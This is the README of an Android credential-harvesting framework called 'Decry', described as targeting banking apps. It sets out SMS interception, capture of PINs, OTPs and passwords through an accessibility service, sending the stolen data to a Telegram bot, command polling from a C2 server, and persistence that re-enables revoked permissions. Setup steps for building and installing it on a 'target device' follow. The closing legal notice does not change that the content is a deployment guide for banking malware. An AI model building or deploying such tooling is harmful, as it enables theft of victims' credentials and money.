# Decry - Android Credential Harvesting Framework

Decry is a Flutter-based Android application designed for credential harvesting from banking applications. It leverages system permissions and accessibility services to capture SMS messages, PIN codes, and passwords entered in target applications.

## Architecture

```
[Admin] → [CryTake Dashboard] → [C2 Server (Vercel)]
                          ↗
[Victim Device] → [Decry App]
  │  ↳ SMS Capture (toggleable)
  │  ↳ Accessibility Service (PIN/password capture)
  │  ↳ DND Control (toggleable)
  │
  ↳ Data Exfiltration: All captured data → Telegram Bot (direct)
  ↳ Command Polling: Polls C2 server every 10s for commands
```

**CryTake Integration:**
- Device registration: `POST /api/checkin/:deviceId` with device metadata
- Command polling: `GET /api/poll/:deviceId` receives queued commands
- Commands: `start_sms_capture`, `stop_sms_capture`, `toggle_dnd`, `target_app`, `untarget_app`
- Device management: Admin uses CryTake dashboard to target apps and send commands

### Components

#### 1. MainActivity.kt (`android/app/src/main/kotlin/com/decry/decry/MainActivity.kt`)
- **Permission Management**: Requests READ_SMS, RECEIVE_SMS, READ_PHONE_STATE, READ_PHONE_NUMBERS
- **SIM Collection**: Retrieves phone number, SIM serial, and device ID
- **DND Control**: Toggles Do Not Disturb mode
- **Command Polling**: Polls CryTake C2 server for queued commands every 10 seconds
- **Anti-Revocation**: Continuous background monitoring that re-enables permissions if revoked
- **Target App Management**: Maintains list of targeted apps (persisted in SharedPreferences)

#### 2. DecryBackgroundService.kt (`android/app/src/main/kotlin/com/decry/decry/DecryBackgroundService.kt`)
- Foreground service for persistent background operation
- Handles boot completion to survive device restarts
- Manages C2 polling and command execution

#### 3. SmsReceiver.kt (`android/app/src/main/kotlin/com/decry/decry/SmsReceiver.kt`)
- Captures incoming SMS messages in real-time (high priority intent filter: 999)
- Only forwards when SMS capture mode is active (triggered by CryTake command)
- Sends captured data directly to Telegram bot API

#### 4. DecryAccessibilityService.kt (`android/app/src/main/kotlin/com/decry/decry/DecryAccessibilityService.kt`)
- Monitors target banking apps (dynamically configurable via CryTake)
- Captures PIN codes (4-8 digits) via:
  - Text input changes
  - Button click sequences
  - View focus events
  - Node tree traversal
- Captures OTP codes from notifications
- Captures password input from EditText fields

#### 5. DataExfiltratorReceiver.kt (`android/app/src/main/kotlin/com/decry/decry/DataExfiltratorReceiver.kt`)
- Receives broadcast intents from SMS Receiver and Accessibility Service
- Formats data with device info and timestamps
- Sends formatted messages directly to Telegram bot API

#### 6. DecryBootReceiver.kt (`android/app/src/main/kotlin/com/decry/decry/DecryBootReceiver.kt`)
- Receives BOOT_COMPLETED, MY_PACKAGE_REPLACED, QUICKBOOT_POWERON
- Relaunches DecryBackgroundService after device restart

### Persistence Mechanisms

1. **Boot Persistence**: DecryBootReceiver auto-starts background service
2. **Accessibility Persistence**: Programmatically re-enables accessibility service if disabled
3. **Anti-Revocation**: Monitors and restores permissions every 3 seconds
4. **Target App Persistence**: Target app list saved in SharedPreferences

### Permissions Required
```xml
<uses-permission android:name="android.permission.READ_SMS" />
<uses-permission android:name="android.permission.RECEIVE_SMS" />
<uses-permission android:name="android.permission.READ_PHONE_STATE" />
<uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
<uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY" />
<uses-permission android:name="android.permission.WRITE_SETTINGS" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
```

## Setup

### Environment Variables (for Telegram exfiltration)
Set these in your build environment or device:
```
BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz
ADMIN_CHAT_ID=123456789
```

### Configuration
1. Configure CryTake server URL in `MainActivity.kt`:
   ```kotlin
   private val c2ServerUrl = "https://your-crytake-instance.com/api"
   ```

2. Build the APK:
   ```bash
   flutter build apk --release
   ```

3. Install on target device with all permissions granted

## Usage with CryTake

1. Deploy CryTake dashboard to get C2 server endpoint
2. Update `c2ServerUrl` in MainActivity.kt with your CryTake instance URL
3. Build and install Decry on target device
4. Device auto-registers with CryTake on first launch (using `packageName.hashCode()` as device ID)
5. Admin uses CryTake dashboard to:
   - View connected devices (`/api/devices`)
   - Send commands (`/api/command`) - e.g., start_sms_capture, target_app
   - Device polls for commands every 10 seconds via `GET /api/poll/:deviceId`

## Current Status
- ✅ Flutter UI with permission flow
- ✅ Runtime permission requests (SMS, Phone)
- ✅ Accessibility service with credential capture
- ✅ SMS interception with toggleable capture mode
- ✅ Direct Telegram exfiltration
- ✅ DND control
- ✅ SIM number collection
- ✅ Command polling via CryTake C2 server
- ✅ Device auto-registration with CryTake
- ✅ Boot persistence
- ✅ Anti-revocation monitoring
- ✅ Target app management (dynamic)

## Dependencies
- Flutter SDK 3.35.4+
- Dart SDK 3.9.2+
- Telegram Bot Token
- CryTake C2 Server

## Development Commands
```bash
flutter pub get
flutter analyze
flutter build apk --release
```

## ⚠️ Legal Notice
This software is for security research and authorized testing only. Unauthorized access to computer systems or networks is illegal. Always obtain proper authorization before deploying this application.